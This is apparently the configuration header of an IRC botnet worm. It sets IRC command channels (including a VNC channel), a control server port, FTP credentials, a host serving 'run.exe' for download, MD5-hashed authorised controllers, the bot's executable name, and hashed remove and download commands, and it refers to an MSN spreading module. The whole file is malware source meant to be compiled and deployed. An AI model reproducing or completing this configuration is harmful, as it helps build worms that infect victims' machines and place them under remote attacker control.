
////////////////
/// CHANNELS ///
////////////////

//////////////////////////////////////////////////
/////    YOU MIGHT WANNA EDIT MSNWORM.CPP    /////
///// TO CHANGE MESSAGES FOR THE MSN SPREAD! /////
//////////////////////////////////////////////////

char Chan[] = "";
BOOL UseChanPass = TRUE;
char ChanPass[] = "";
char VNCChan[] = "#vnc#";
char TransferChannel[] = "#transfer";
char InfoChan[] = "#info.chan#";

///////////////////
/// SERVER LIST ///
///////////////////

IRCSERVERLIST IrcServerList[] = {
	{"", 5667, FALSE, ""},
	{NULL, 0, FALSE, NULL}
};


///////////////////////////
/// FTP & CFTP SETTINGS ///
///////////////////////////

char FTPUser[] = "t0nixx";
char FTPPass[] = "";

char CFTPHost[32] = "IP";
int CFTPPort = 21;
char CFTPUser[32] = "";
char CFTPPass[32] = "";
char CFTPFile[32] = "run.exe";

//////////////////////
/// AUTH HOST      ///
/// MD5 ENCRYPTION ///
//////////////////////

char *AuthHosts[] = {
	"89ddb71c7ab9de12ef7b25356b031dca",
	NULL
};

//////////////////////////////////////
/// CHANGE THESE EVERY COMPILATION ///
//////////////////////////////////////

char BotID[] = "Windows klass";
char FileName[] = "klass.exe";
char OrderPrefix[] = "!";

///////////////////////////////
///    OTHER VARIABLES      ///
/// NO NEED TO CHANGE THESE ///
///////////////////////////////

int reconnect_time = 5000;
int MaxWaitTime = 300;
unsigned int NickLen = 15;
unsigned long mutex_time = 33334;


///////////////////////////////////
///  REMOVE & DOWNLOAD COMMAND  ///
///  ONLY USE HASHED COMMANDS   ///
///////////////////////////////////

char Command_Remove[] = "099af53f601532dbd31e0ea99ffdeb64"; // .h delete
char Command_Download[] = "4b4f2ac1277bad81c7c7bffd4c8e02d6"; // .h download